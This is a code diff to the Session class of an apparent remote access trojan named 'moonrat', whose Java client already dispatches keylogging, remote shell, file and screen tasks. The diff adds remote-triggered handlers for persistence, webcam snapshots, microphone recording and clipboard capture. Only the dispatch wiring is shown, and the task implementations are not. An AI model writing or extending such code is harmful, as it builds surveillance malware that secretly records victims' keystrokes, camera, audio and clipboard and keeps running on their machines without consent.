@@ -10,10 +10,13 @@ import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import moonrat.Protocol;
 import moonrat.Protocol.Frame;
+import moonrat.client.tasks.ClipboardTasks;
 import moonrat.client.tasks.FileTasks;
 import moonrat.client.tasks.FunTasks;
 import moonrat.client.tasks.GameTasks;
 import moonrat.client.tasks.Keylog;
+import moonrat.client.tasks.MediaTasks;
+import moonrat.client.tasks.PersistTasks;
 import moonrat.client.tasks.ScreenTasks;
 import moonrat.client.tasks.ShellTasks;
 
@@ -62,6 +65,7 @@ public final class Session {
             }
         } finally {
             keylog.shutdown();
+            ClipboardTasks.shutdown();
             workers.shutdownNow();
         }
     }
@@ -104,6 +108,18 @@ public final class Session {
                 break;
             case Protocol.GAME_REQ:
                 response = GameTasks.handle(request.field(0), request.field(1));
+                break;
+            case Protocol.PERSIST_REQ:
+                response = PersistTasks.handle(request.field(0), request.field(1));
+                break;
+            case Protocol.CAM_REQ:
+                response = MediaTasks.snap(request.field(0));
+                break;
+            case Protocol.MIC_REQ:
+                response = MediaTasks.record(request.field(0));
+                break;
+            case Protocol.CLIP_REQ:
+                response = ClipboardTasks.handle(request.field(0), request.field(1));
                 break;
             default:
                 response = null;
